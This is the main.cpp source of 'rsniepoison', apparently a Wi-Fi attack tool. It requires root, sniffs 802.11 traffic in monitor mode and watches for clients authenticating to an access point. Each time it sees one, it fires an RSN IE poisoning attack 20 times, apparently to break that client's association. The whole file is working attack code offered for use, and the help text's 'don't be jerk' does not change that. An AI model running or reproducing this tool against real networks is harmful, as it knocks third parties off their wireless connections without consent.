//
//  main.cpp
//  rsniepoison
//
//  Created by BlueCocoa on 2017/5/21.
//  Copyright © 2017 BlueCocoa. All rights reserved.
//

#include <getopt.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/signal.h>
#include <unistd.h>
#include <atomic>
#include <condition_variable>
#include <iostream>
#include <vector>
#include <thread>
#include "WirelessKit.hpp"

using namespace std;
using namespace WirelessKit;

#ifndef DEFAULT_WLAN
    #if defined(__APPLE__)
        #define DEFAULT_WLAN "en0"
    #elif defined(__RASPBIAN__)
        #define DEFAULT_WLAN "wlan0"
    #else
        #warning You can set a default interface for you platform at compile time by `DEFAULT_WLAN=ifname make all`
    #endif
#endif

const struct option options[] = {
    { "channel", optional_argument, NULL, 'c'},
    { "ifname",  optional_argument, NULL, 'i' },
    { "help",    no_argument,       NULL, 'h' },
};

void quit(int);

atomic_bool working;
atomic_bool sniffer_done;
atomic_bool channel_done;
condition_variable cond;

int main(int argc, const char * argv[]) {
    if (getuid()) {
        fprintf(stderr, "This tool requires root privileges\n");
        exit(EXIT_FAILURE);
    }
    
    Interface ifname(DEFAULT_WLAN);
    
    int arg, argslot;
    int channel = -1;
    while (argslot = -1, (arg = getopt_long(argc, (char * const *)argv, "c:i:h", options, &argslot)) != -1) {
        switch (arg) {
            case 'c' : {
                channel = atoi(optarg);
                break;
            }
            case 'i' : {
                ifname = Interface(optarg);
                break;
            }
            case 'h' : {
                fprintf(stdout, "%s [-i|--ifname " DEFAULT_WLAN "] [-c|--channel D]\nUse at your own risk & don't be jerk!\n", argv[0]);
                return 0;
            }
        }
    }
    
#if defined(__RASPBIAN__)
    pcap_t * pcap_handle = NULL;
    char pcap_error[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(ifname._ifname.c_str(), 65536, 1, 1, pcap_error);
    pcap_set_datalink(pcap_handle, DLT_IEEE802_11_RADIO);
    pcap_set_rfmon(pcap_handle, 1);
    ifname._pcap_handle = pcap_handle;
#endif

    if (ifname.open()) {
        channel = 11;
        if (channel != -1) ifname.setChannel(channel);
        
        working = true;
        sniffer_done = false;
        signal(SIGINT, quit);
        Sniffer sniffer(ifname);
        
        sniffer.capture([&ifname](const CapturedPacket & packet) -> bool {
            if (packet.is_valid()) {
                STA station;
                AP ap;
                bool has_client = false;
                
                if (packet.header()->fc.from_ds == 0 && packet.header()->fc.to_ds == 0) {
                    ap.setMAC(*packet.header()->destination());
                    station.setMAC(*packet.header()->transmitter());
                    has_client = true;
                }
                
                if (has_client) {
                    uint8_t * mac = station.mac();
                    if (mac[0] == 0x33 && mac[1] == 0x33) has_client = false;
                    if (mac[0] == 0x01 && mac[1] == 0x00) has_client = false;
                    if (mac[0] == 0xFF && mac[1] == 0xFF) has_client = false;
                }
                
                if (has_client) {
                    if (packet.header()->fc.type == 0 && packet.header()->fc.subtype == 11) {
                        const uint8_t * body = packet.body_data();
                        if (*(uint16_t *)&body[0] == 0 && *(uint16_t *)&body[2] == 1) {
                            RSNIEPoison poison(ap, station);
                            for (int i = 0; i < 20; i++) poison.poison(ifname);
                            fprintf(stdout, "STA: %s -> AP: %s\n", station._mac->stringify().c_str(), ap._mac->stringify().c_str());
                        }
                    }
                }
                
                fflush(stdout);
            }
            if (!working) sniffer_done = true;
            return working;
        });
        
        std::mutex mtx;
        std::thread ([&]{
            std::unique_lock<std::mutex> lock(mtx);
            cond.wait(lock);
            working = false;
            while (!sniffer_done) this_thread::yield();
        }).join();
    }
    
    return 0;
}

void quit(int) {
    working = false;
    cond.notify_one();
}
